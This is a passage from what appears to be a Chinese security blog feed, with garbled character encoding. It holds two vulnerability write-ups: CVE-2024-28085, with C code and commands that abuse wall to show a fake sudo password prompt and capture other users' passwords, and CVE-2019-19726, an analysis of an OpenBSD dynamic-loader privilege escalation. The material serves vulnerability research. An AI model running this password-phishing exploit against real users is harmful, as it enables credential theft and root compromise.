æ¥è·å–ä¸Šè¿°å¯†ç </li></ol><p>ç›‘æ§ç¨‹åºè¿è¡Œæ˜¯é€šè¿‡å¾ªç¯æšä¸¾å’Œè¯»å– <code>/proc/pid/cmdline</code> æ¥å®ç°çš„ï¼ˆåŒ…æ‹¬å¯†ç çš„è¯»å–ï¼‰ï¼Œé€šè¿‡ <code>wall</code> å‘é€æ¶ˆæ¯çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Username to show in prompt</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USERNAME <span class="meta-string">"root"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Set color (48,10,36 is gnome-terminal)</span></span><br><span class="line"><span class="comment">// #define USER_R "48"</span></span><br><span class="line"><span class="comment">// #define USER_G "10"</span></span><br><span class="line"><span class="comment">// #define USER_B "36"</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USER_R <span class="meta-string">"0"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USER_G <span class="meta-string">"0"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USER_B <span class="meta-string">"0"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* _argv[] = &#123;<span class="string">"prog"</span>,</span><br><span class="line">        <span class="string">"\033[3A"</span> <span class="comment">// Move up 3</span></span><br><span class="line">        <span class="string">"\033[K"</span>  <span class="comment">// Delete prompt</span></span><br><span class="line">        <span class="string">"[sudo] password for "</span>USERNAME<span class="string">": \033[47m \033[40m"</span></span><br><span class="line">        <span class="string">"\033[?25l"</span></span><br><span class="line">        <span class="comment">// Set forground RGB (48,10,36)</span></span><br><span class="line">        <span class="comment">// hide typing</span></span><br><span class="line">        <span class="string">"\033[38;2;"</span>USER_R<span class="string">";"</span>USER_G<span class="string">";"</span>USER_B<span class="string">"m"</span>,</span><br><span class="line">        <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* _envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(<span class="string">"/usr/bin/wall"</span>, _argv, _envp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„åˆ©ç”¨æ–¹å¼å¯ä»¥å‚è€ƒåŸä½œè€…çš„ GitHub ä»“åº“ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/skyler-ferrante/CVE-2024-28085.git</span><br><span class="line">./build.sh</span><br><span class="line">./spy &gt; proc.log &amp; ./watch "sudo systemctl start apache2"; ./watch "systemctl start apache2"; sleep .01; ./throw</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡æœ‰åšç°åœºæ¢å¤ï¼Œæ‰€ä»¥è¿è¡Œä¹‹åï¼Œå…¶ä»–ç”¨æˆ·çš„ç»ˆç«¯ç›´æ¥åºŸäº†ï¼šä¸æ˜¾ç¤ºå…‰æ ‡ï¼Œè¾“å…¥çš„æ–‡å­—ä¹Ÿä¸å¯è§ã€‚</p><ul><li><code>\033[?25h</code> æ˜¾ç¤ºå…‰æ ‡</li><li><code>\033[0m</code> é‡ç½®æ ¼å¼</li></ul><p>æ‰€ä»¥ï¼Œå¥½ä¸€ç‚¹çš„åˆ©ç”¨æ–¹å¼éœ€è¦åœ¨æ‹¿åˆ°å¯†ç åï¼Œé‡æ–°é€šè¿‡ <code>wall</code> å‘é€æ¶ˆæ¯æ¥æ¢å¤å¯¹æ–¹çš„ç»ˆç«¯è®¾ç½®ã€‚</p><p>å…¶ä»–åˆ©ç”¨åœºæ™¯ï¼š</p><ul><li>ç›‘æ§ SSH ç™»å½•ï¼Œåˆ©ç”¨æ–¹å¼è·Ÿå‰é¢ä¸€æ ·</li><li>ç›‘æ§ <code>cat ~/.ssh/id_rsa.pub</code>ï¼Œæ›¿æ¢å‰ªè´´æ¿æ•°æ®</li></ul><h2 id="0x04-References"><a href="#0x04-References" class="headerlink" title="0x04. References"></a>0x04. References</h2><ol><li><a href="https://www.cnblogs.com/unclemac/p/12783387.html" target="_blank" rel="noopener">https://www.cnblogs.com/unclemac/p/12783387.html</a></li><li><a href="https://github.com/skyler-ferrante/CVE-2024-28085/tree/main" target="_blank" rel="noopener">https://github.com/skyler-ferrante/CVE-2024-28085/tree/main</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CVE-2024-28085 Improper Neutralization of Escape Sequences in Wall&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Linux" scheme="https://programlife.net/categories/Vulnerability/Linux/"/>
    
    
      <category term="æ¼æ´æ¡ˆä¾‹ç ”ç©¶" scheme="https://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6/"/>
    
      <category term="wall" scheme="https://programlife.net/tags/wall/"/>
    
      <category term="Escape Sequence" scheme="https://programlife.net/tags/Escape-Sequence/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-19726 OpenBSD dynamic loader æœ¬åœ°ææƒæ¼æ´</title>
    <link href="https://programlife.net/2024/03/20/cve-2019-19726-openbsd-dynamic-loader-lpe/"/>
    <id>https://programlife.net/2024/03/20/cve-2019-19726-openbsd-dynamic-loader-lpe/</id>
    <published>2024-03-20T13:33:37.000Z</published>
    <updated>2024-03-20T12:55:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2019-19726 OpenBSD dynamic loader Local Privilege Escalation Vulnerability</p><a id="more"></a><h2 id="0x01-æ¼æ´ä»‹ç»"><a href="#0x01-æ¼æ´ä»‹ç»" class="headerlink" title="0x01. æ¼æ´ä»‹ç»"></a>0x01. æ¼æ´ä»‹ç»</h2><p>CVE-2019-19726 æ˜¯ OpenBSD dynamic loader åœ¨æ¸…ç† <strong>LD_LIBRARY_PATH</strong> ç¯å¢ƒå˜é‡æ—¶å­˜åœ¨çš„ä¸€ä¸ªæœ¬åœ°ææƒæ¼æ´ï¼Œç”± Qualys Research Team å‘ç°ã€‚è¯¥æ¼æ´è·å¾— 2020 å¹´ Pwnie Awards Best Privilege Escalation Bug æåã€‚æ¼æ´è¡¥ä¸å¯å‚è€ƒ <a href="https://github.com/openbsd/src/commit/eee3c75f9abd5ea51e066dd0fe6b1efa470e4d0c" target="_blank" rel="noopener">libexec/ld.so/loader.c</a>ã€‚</p><h2 id="0x02-æ¼æ´åˆ†æ"><a href="#0x02-æ¼æ´åˆ†æ" class="headerlink" title="0x02. æ¼æ´åˆ†æ"></a>0x02. æ¼æ´åˆ†æ</h2><h3 id="2-1-setrlimit-RLIMIT-DATA"><a href="#2-1-setrlimit-RLIMIT-DATA" class="headerlink" title="2.1 setrlimit / RLIMIT_DATA"></a>2.1 setrlimit / RLIMIT_DATA</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getrlimit</span><span class="params">(<span class="keyword">int</span> resource, struct rlimit *rlim)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setrlimit</span><span class="params">(<span class="keyword">int</span> resource, <span class="keyword">const</span> struct rlimit *rlim)</span></span>;</span><br></pre></td></tr></table></figure><blockquote><p>The <strong>getrlimit</strong>() and <strong>setrlimit</strong>() system calls get and set resource limits respectively. Each resource has an associated <strong>soft</strong> and <strong>hard</strong> limit, as defined by the <em>rlimit</em> structure:</p></blockquote><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> &#123;</span></span><br><span class="line">    <span class="keyword">rlim_t</span> rlim_cur;  <span class="comment">/* Soft limit */</span></span><br><span class="line">    <span class="keyword">rlim_t</span> rlim_max;  <span class="comment">/* Hard limit (ceiling for rlim_cur) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>The soft limit is the value that the kernel enforces for the corresponding resource. The hard limit acts as a ceiling for the soft limit: an unprivileged process may only set its soft limit to a value in the range from 0 up to the hard limit, and (irreversibly) lower its hard limit. A privileged process (under Linux: one with the <strong>CAP_SYS_RESOURCE</strong> capability) may make arbitrary changes to either limit value.</p><p>The value <strong>RLIM_INFINITY</strong> denotes no limit on a resource (both in the structure returned by <strong>getrlimit</strong>() and in the structure passed to <strong>setrlimit</strong>()).</p></blockquote><p>ç®€å•æ¥è¯´ï¼Œè¿›ç¨‹å¯ä»¥é€šè¿‡ <code>setrlimit</code> æ¥é™åˆ¶è‡ªèº«çš„èµ„æºä½¿ç”¨ä¸Šé™ï¼š</p><ul><li>å¯¹äºæ™®é€šè¿›ç¨‹è€Œè¨€ï¼Œsoft limit åªèƒ½ä½äºåŒºé—´ <code>[0, hard limit]</code>ï¼Œè€Œ hard limit åˆ™åªèƒ½è¿›è¡Œä¸‹è°ƒæ“ä½œ</li><li>å¯¹äºç‰¹æƒè¿›ç¨‹è€Œè¨€ï¼Œsoft limit å¯ä»¥éšæ„è®¾ç½®</li><li><code>RLIM_INFINITY</code> è¡¨ç¤ºæ²¡æœ‰ä»»ä½•é™åˆ¶</li></ul><p>ç¬¬ä¸€ä¸ªå‚æ•° <code>resource</code> è¡¨ç¤ºèµ„æºç±»å‹ï¼Œ<code>RLIMIT_DATA</code> è¡¨ç¤ºå†…å­˜èµ„æºã€‚</p><blockquote><p><strong>RLIMIT_DATA</strong></p><p>The maximum size of the processâ€™s data segment (initialized data, uninitialized data, and heap). This limit affects calls to <strong>brk</strong>(2) and <strong>sbrk</strong>(2), which fail with the error <strong>ENOMEM</strong> upon encountering the soft limit of this resource.</p></blockquote><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_rlimit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rl</span>;</span></span><br><span class="line">    getrlimit(RLIMIT_DATA, &amp;rl);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"cur=%lu, max=%lu\n"</span>, rl.rlim_cur, rl.rlim_max);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">try_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc %lu bytes: "</span>, size);</span><br><span class="line">    <span class="keyword">void</span> *p = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, strerror(errno));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Succeeded\n"</span>);</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> val = <span class="number">1024</span> * <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rl</span> = &#123;</span>val, val&#125;;</span><br><span class="line">    show_rlimit();</span><br><span class="line">    setrlimit(RLIMIT_DATA, &amp;rl);</span><br><span class="line">    show_rlimit();</span><br><span class="line"></span><br><span class="line">    try_malloc(<span class="number">1024</span>);</span><br><span class="line">    try_malloc(val);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç»“æœï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> ./a.out</span><br><span class="line">cur=18446744073709551615, max=18446744073709551615</span><br><span class="line">cur=1048576, max=1048576</span><br><span class="line">malloc 1024 bytes: Succeeded</span><br><span class="line">malloc 1048576 bytes: Cannot allocate memory</span><br></pre></td></tr></table></figure><h3 id="2-2-ARG-MAX"><a href="#2-2-ARG-MAX" class="headerlink" title="2.2 ARG_MAX"></a>2.2 ARG_MAX</h3><p><strong>ARG_MAX</strong> å®šä¹‰äº <code>limits.h</code> å¤´æ–‡ä»¶ä¸­ï¼Œè¡¨ç¤ºç¨‹åºå‘½ä»¤è¡Œå‚æ•°ï¼ˆåŒ…å«ç¯å¢ƒå˜é‡å‚æ•°ï¼‰çš„æœ€å¤§å¤§å°ã€‚</p><blockquote><p><strong>ARG_MAX</strong></p><p>Maximum length of argument to the <em>exec</em> functions including environment data.<br>Minimum Acceptable Value: {_POSIX_ARG_MAX}</p><p><strong>_POSIX_ARG_MAX</strong></p><p>Maximum length of argument to the <em>exec</em> functions including environment data.<br>Value: 4096</p></blockquote><h3 id="2-3-CVE-2019-19726"><a href="#2-3-CVE-2019-19726" class="headerlink" title="2.3 CVE-2019-19726"></a>2.3 CVE-2019-19726</h3><p>å¯¹äº SUID-root ç¨‹åºï¼Œé“¾æ¥å™¨ <code>ld.so</code> éœ€è¦å»é™¤å±é™©çš„ç¯å¢ƒå˜é‡ï¼ˆæ¯”å¦‚ <code>LD_LIBRARY_PATH</code> ç­‰ï¼‰ï¼Œä»¥é˜²æ­¢é€šè¿‡ç¯å¢ƒå˜é‡æ¥å®ç°ææƒã€‚</p><p>æ¯”å¦‚ï¼Œglibc ä¸­çš„ <code>_dl_non_dynamic_init</code> å‡½æ•°è´Ÿè´£æ¸…ç†æ­¤ç±»å±é™©çš„ç¯å¢ƒå˜é‡ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_dl_non_dynamic_init (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">  <span class="keyword">if</span> (__libc_enable_secure)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> unsecure_envvars[] =</span><br><span class="line">    UNSECURE_ENVVARS</span><br><span class="line">#ifdef EXTRA_UNSECURE_ENVVARS</span><br><span class="line">    EXTRA_UNSECURE_ENVVARS</span><br><span class="line">#endif</span><br><span class="line">    ;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *cp = unsecure_envvars;</span><br><span class="line">    <span class="keyword">while</span> (cp &lt; unsecure_envvars + <span class="keyword">sizeof</span> (unsecure_envvars))</span><br><span class="line">    &#123;</span><br><span class="line">      __unsetenv (cp);</span><br><span class="line">      cp = (<span class="keyword">const</span> <span class="keyword">char</span> *) __rawmemchr (cp, <span class="string">'\0'</span>) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !HAVE_TUNABLES</span></span><br><span class="line">    <span class="keyword">if</span> (__access (<span class="string">"/etc/suid-debug"</span>, F_OK) != <span class="number">0</span>)</span><br><span class="line">      __unsetenv (<span class="string">"MALLOC_CHECK_"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>UNSECURE_ENVVARS</code> çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Environment variable to be removed for SUID programs.  The names are</span></span><br><span class="line"><span class="comment">   all stuffed in a single string which means they have to be terminated</span></span><br><span class="line"><span class="comment">   with a '\0' explicitly.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNSECURE_ENVVARS    \</span></span><br><span class="line">  <span class="string">"GCONV_PATH\0"</span>            \</span><br><span class="line">  <span class="string">"GETCONF_DIR\0"</span>           \</span><br><span class="line">  GLIBC_TUNABLES_ENVVAR     \</span><br><span class="line">  <span class="string">"HOSTALIASES\0"</span>           \</span><br><span class="line">  <span class="string">"LD_AUDIT\0"</span>              \</span><br><span class="line">  <span class="string">"LD_DEBUG\0"</span>              \</span><br><span class="line">  <span class="string">"LD_DEBUG_OUTPUT\0"</span>       \</span><br><span class="line">  <span class="string">"LD_DYNAMIC_WEAK\0"</span>       \</span><br><span class="line">  <span class="string">"LD_HWCAP_MASK\0"</span>         \</span><br><span class="line">  <span class="string">"LD_LIBRARY_PATH\0"</span>       \</span><br><span class="line">  <span class="string">"LD_ORIGIN_PATH\0"</span>        \</span><br><span class="line">  <span class="string">"LD_PRELOAD\0"</span>            \</span><br><span class="line">  <span class="string">"LD_PROFILE\0"</span>            \</span><br><span class="line">  <span class="string">"LD_SHOW_AUXV\0"</span>          \</span><br><span class="line">  <span class="string">"LD_USE_LOAD_BIAS\0"</span>      \</span><br><span class="line">  <span class="string">"LOCALDOMAIN\0"</span>           \</span><br><span class="line">  <span class="string">"LOCPATH\0"</span>               \</span><br><span class="line">  <span class="string">"MALLOC_TRACE\0"</span>          \</span><br><span class="line">  <span class="string">"NIS_PATH\0"</span>              \</span><br><span class="line">  <span class="string">"NLSPATH\0"</span>               \</span><br><span class="line">  <span class="string">"RESOLV_HOST_CONF\0"</span>      \</span><br><span class="line">  <span class="string">"RES_OPTIONS\0"</span>           \</span><br><span class="line">  <span class="string">"TMPDIR\0"</span>                \</span><br><span class="line">  <span class="string">"TZDIR\0"</span></span><br></pre></td></tr></table></figure><p>FreeBSD ç›¸å…³å¤„ç†ä»£ç å¦‚ä¸‹ï¼ˆå‚è€ƒ <a href="https://github.com/openbsd/src/blob/d2ce55dbd7845b33dafe44529e6ceb6b1c8ec6d5/libexec/ld.so/loader.c#L263" target="_blank" rel="noopener">src/libexec/ld.so/loader.c</a>ï¼‰ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * grab interesting environment variables, zap bad env vars if</span></span><br><span class="line"><span class="comment"> * issetugid, and set the exported environ and __progname variables</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">_dl_setup_env(<span class="keyword">const</span> <span class="keyword">char</span> *argv0, <span class="keyword">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> progname_storage[NAME_MAX+<span class="number">1</span>] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Get paths to various things we are going to use.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  _dl_debug = _dl_getenv(<span class="string">"LD_DEBUG"</span>, envp) != <span class="literal">NULL</span>;</span><br><span class="line">  _dl_libpath = _dl_split_path(_dl_getenv(<span class="string">"LD_LIBRARY_PATH"</span>, envp));</span><br><span class="line">  _dl_preload = _dl_getenv(<span class="string">"LD_PRELOAD"</span>, envp);</span><br><span class="line">  _dl_bindnow = _dl_getenv(<span class="string">"LD_BIND_NOW"</span>, envp) != <span class="literal">NULL</span>;</span><br><span class="line">  _dl_traceld = _dl_getenv(<span class="string">"LD_TRACE_LOADED_OBJECTS"</span>, envp) != <span class="literal">NULL</span>;</span><br><span class="line">  _dl_tracefmt1 = _dl_getenv(<span class="string">"LD_TRACE_LOADED_OBJECTS_FMT1"</span>, envp);</span><br><span class="line">  _dl_tracefmt2 = _dl_getenv(<span class="string">"LD_TRACE_LOADED_OBJECTS_FMT2"</span>, envp);</span><br><span class="line">  _dl_traceprog = _dl_getenv(<span class="string">"LD_TRACE_LOADED_OBJECTS_PROGNAME"</span>, envp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Don't allow someone to change the search paths if he runs</span></span><br><span class="line"><span class="comment">   * a suid program without credentials high enough.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  _dl_trust = !_dl_issetugid();</span><br><span class="line">  <span class="keyword">if</span> (!_dl_trust) &#123;  <span class="comment">/* Zap paths if s[ug]id... */</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_libpath) &#123;</span><br><span class="line">      _dl_free_path(_dl_libpath);</span><br><span class="line">      _dl_libpath = <span class="literal">NULL</span>;</span><br><span class="line">      _dl_unsetenv(<span class="string">"LD_LIBRARY_PATH"</span>, envp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (_dl_preload) &#123;</span><br><span class="line">      _dl_preload = <span class="literal">NULL</span>;</span><br><span class="line">      _dl_unsetenv(<span class="string">"LD_PRELOAD"</span>, envp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹ <code>LD_LIBRARY_PATH</code> çš„å¤„ç†æœ‰ç‚¹ç‰¹æ®Šï¼Œé¢å¤–è°ƒç”¨äº† <code>_dl_split_path</code> å‡½æ•°ï¼Œå¯¹åº”çš„ä»£ç å¦‚ä¸‹ï¼ˆå‚è€ƒ <a href="https://github.com/openbsd/src/blob/d2ce55dbd7845b33dafe44529e6ceb6b1c8ec6d5/libexec/ld.so/path.c#L24" target="_blank" rel="noopener">src/libexec/ld.so/path.c</a>ï¼‰ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> **</span><br><span class="line">_dl_split_path(<span class="keyword">const</span> <span class="keyword">char</span> *searchpath)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *pp, *p_begin;</span><br><span class="line">  <span class="keyword">char</span> **retval;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (searchpath == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Count ':' or ';' in searchpath */</span></span><br><span class="line">  pp = searchpath;</span><br><span class="line">  <span class="keyword">while</span> (*pp) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*pp == <span class="string">':'</span> || *pp == <span class="string">';'</span>)</span><br><span class="line">      count++;</span><br><span class="line">    pp++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* one more for NULL entry */</span></span><br><span class="line">  count++;</span><br><span class="line"></span><br><span class="line">  retval = _dl_reallocarray(<span class="literal">NULL</span>, count, <span class="keyword">sizeof</span>(*retval));</span><br><span class="line">  <span class="keyword">if</span> (retval == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè°ƒç”¨ <code>_dl_reallocarray</code> åˆ†é…å†…å­˜ï¼Œå¦‚æœåˆ†é…å¤±è´¥ï¼Œ<code>_dl_split_path</code> å°†è¿”å› <code>NULL</code>ã€‚</p><p>å›åˆ° <code>_dl_setup_env</code> å‡½æ•°ï¼Œå¯ä»¥å‘ç°å½“ <code>_dl_split_path</code> è¿”å› <code>NULL</code> æ—¶ï¼Œç¯å¢ƒå˜é‡ <code>LD_LIBRARY_PATH</code> å°†ä¸ä¼šè¢«æ¸…ç†ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡ so åŠ¨æ€åº“åŠ è½½åŠ«æŒæ¥å®ç° root ææƒã€‚</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_dl_libpath = _dl_split_path(_dl_getenv(<span class="string">"LD_LIBRARY_PATH"</span>, envp));</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">_dl_trust = !_dl_issetugid();</span><br><span class="line"><span class="keyword">if</span> (!_dl_trust) &#123;  <span class="comment">/* Zap paths if s[ug]id... */</span></span><br><span class="line">  <span class="keyword">if</span> (_dl_libpath) &#123;</span><br><span class="line">    _dl_free_path(_dl_libpath);</span><br><span class="line">    _dl_libpath = <span class="literal">NULL</span>;</span><br><span class="line">    _dl_unsetenv(<span class="string">"LD_LIBRARY_PATH"</span>, envp);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-æ¼æ´åˆ©ç”¨"><a href="#0x03-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x03. æ¼æ´åˆ©ç”¨"></a>0x03. æ¼æ´åˆ©ç”¨</h2><p>åŸä½œè€…æŒ‘é€‰äº† <code>/usr/bin/chpass</code> æ¥å®ç°æ¼æ´åˆ©ç”¨ï¼Œå…¶ <code>main</code> å‡½æ•°åšäº†ä»¥ä¸‹æ“ä½œï¼š</p><ol><li>è°ƒç”¨ <code>setuid(0)</code></li><li>è°ƒç”¨ <code>pw_init</code> æŠŠ <code>RLIMIT_DATA</code> é‡ç½®æˆäº† <code>RLIM_INFINITY</code></li><li>è°ƒç”¨ <code>pw_mkdb</code> é€šè¿‡ <code>vfork / execv</code> æ‰§è¡Œ <code>/usr/sbin/pwd_mkdb</code>ï¼Œå…¶ä¸­ <code>execv</code> ä¼šç»§æ‰¿ç¯å¢ƒå˜é‡</li></ol><p>å½“ <code>/usr/sbin/pwd_mkdb</code> æ‰§è¡Œæ—¶ï¼Œä¼šé‡æ–°è§¦å‘ <code>ld.so</code> ä¸­çš„é€»è¾‘ï¼Œä½†ç”±äºæ­¤æ—¶å·²ç»æ²¡æœ‰äº† <code>RLIMIT_DATA</code> èµ„æºé™åˆ¶ï¼Œä»¥ä¸‹ä»£ç ä¼šæˆåŠŸæ‰§è¡Œï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_dl_libpath = _dl_split_path(_dl_getenv(<span class="string">"LD_LIBRARY_PATH"</span>, envp));</span><br></pre></td></tr></table></figure><p>è€Œç”±äº <code>/usr/sbin/pwd_mkdb</code> å¹¶ä¸æ˜¯ SUID-root ç¨‹åºï¼Œ<code>LD_LIBRARY_PATH</code> ä¸ä¼šè¢«æ¸…ç†ï¼Œå› æ­¤æœ€ç»ˆå¯ä»¥é€šè¿‡ so åŠ¨æ€åº“åŠ è½½åŠ«æŒæ¥å®ç° root ææƒã€‚</p><p>å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹ <code>/usr/bin/chpass</code> è€Œè¨€ï¼Œç”±äº <code>_dl_libpath</code> ä¸º <code>NULL</code>ï¼Œæ‰€ä»¥ <code>LD_LIBRARY_PATH</code> å¯¹ <code>chpass</code> æœ¬èº«æ˜¯ä¸ä¼šèµ·ä½œç”¨çš„ã€‚</p><p>ç»¼ä¸Šï¼Œåº”è¯¥åªæœ‰æå°‘æ•°åˆšå¥½æ»¡è¶³æ¡ä»¶çš„ SUID-root ç¨‹åºï¼Œæ‰å¯ä»¥å®Œæˆè¿™ä¸ªææƒæ¼æ´çš„åˆ©ç”¨ã€‚</p><h2 id="0x04-References"><a href="#0x04-References" class="headerlink" title="0x04. References"></a>0x04. References</h2><ol><li><a href="https://www.qualys.com/2019/12/11/cve-2019-19726/local-privilege-escalation-openbsd-dynamic-loader.txt" target="_blank" rel="noopener">Local Privilege Escalation in OpenBSDâ€™s dynamic loader (CVE-2019-19726)</a> / <a href="https://web.archive.org/web/20221218102051/https://www.qualys.com/2019/12/11/cve-2019-19726/local-privilege-escalation-openbsd-dynamic-loader.txt" target="_blank" rel="noopener">Wayback Machine</a></li><li><a href="https://pwnies.com/qualys-security-advisory-team-2/" target="_blank" rel="noopener">https://pwnies.com/qualys-security-advisory-team-2/</a></li><li><a href="https://github.com/openbsd/src/commit/eee3c75f9abd5ea51e066dd0fe6b1efa470e4d0c" target="_blank" rel="noopener">https://github.com/openbsd/src/commit/eee3c75f9abd5ea51e066dd0fe6b1efa470e4d0c</a></li><li><a href="https://linux.die.net/man/2/setrlimit" target="_blank" rel="noopener">https://linux.die.net/man/2/setrlimit</a></li><li><a href="https://pubs.opengroup.org/onlinepubs/009695399/basedefs/limits.h.html" target="_blank" 